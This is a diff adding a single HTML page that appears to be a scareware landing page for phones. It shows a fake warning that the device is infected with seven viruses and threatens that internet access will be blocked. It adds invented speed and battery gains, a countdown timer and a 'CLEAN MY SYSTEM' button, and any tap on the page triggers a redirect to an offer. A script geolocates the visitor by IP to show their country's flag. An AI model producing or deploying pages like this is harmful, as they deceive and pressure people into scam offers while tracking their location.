@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html webdriver="true">
+
+	<head>
+		<base href="">
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<title>CAREFUL!!!</title>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black">
+		<link rel="stylesheet" type="text/css" href="css/index.css" media="all">
+	</head>
+
+	<body onclick="goto()">
+		<script language="JavaScript" type="text/javascript">
+			var sec = 40;
+			var min = 00;
+
+			function countDown() {
+				sec--;
+				if (sec == -01) {
+					sec = 59;
+					min = min - 1;
+				} else {
+					min = min;
+				}
+				if (sec <= 9) {
+					sec = "0" + sec;
+				}
+				time = (min <= 9 ? "" + min : min) + " minutes and " + sec + " seconds";
+				if (document.getElementById) {
+					document.getElementById('theTime').innerHTML = time;
+				}
+				SD = window.setTimeout("countDown();", 1000);
+				if (min == '00' && sec == '00') {
+					sec = "00";
+					window.clearTimeout(SD);
+				}
+			}
+			window.onload = countDown;
+		</script>
+		<div id="wrapper">
+			<div class="container">
+				<header> <img src="images/logo.png" alt=""><img class="header__logo" align="right"> </header>
+				<section>
+					<h1>Your phone may be infected <span id="blink">(7)</span>with viruses<span id="blink">!!!</span>
+					</h1>
+				</section>
+				<section>
+					<p></p>
+					<h3>This could be caused by your visits to sites with malicious content.</h3>
+					<p>To continue using the Internet, it is recommended to clean your system of viruses and remove the
+						IP from the spam database.</p>
+					<p>Otherwise, internet access by your provider will be blocked</p>
+					<p><b>Usually after cleaning:</b>
+						<br>Speed ​​will increase by:<span
+							style="font-size: 16px; font-weight: bold; color: green; font-family: sans-serif;">76%</span>
+						<br>Battery charge will increase by: <span
+							style="font-size: 16px; font-weight: bold; color: green; font-family: sans-serif;">65%</span>
+					</p>
+					<div id="timer">
+						<p><span class="red2">
+
+								<span style="font-size: 20px; font-weight: bold; color: red; font-family: sans-serif;"
+									id="theTime">0 minutes and 29 seconds</span></span>
+						</p>
+					</div>
+				</section>
+				<footer>
+					<p align="center"><a class="btn" onclick="toOffer()"><strong>CLEAN MY SYSTEM</strong></a>
+					</p>
+				</footer>
+			</div>
+			<script src="../../../assets/link.js"></script>
+			<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+			<script>
+				async function checkIP() {
+					return fetch("https://get.geojs.io/v1/ip/geo.json").then((response) => response.json());
+				}
+				checkIP()
+					.then((result) => { //console.log('checkIP',result)
+						console.log(result);
+						$('.header__logo').attr('src',
+							`https://isgoodday.site/assets/geo/${result.country_code.toLowerCase()}.svg`)
+					})
+					.catch(function(err) {
+						console.log("Error:", err);
+					})
+					.finally(function() {});
+			</script>
+		</div>
+	</body>
+
+</html>
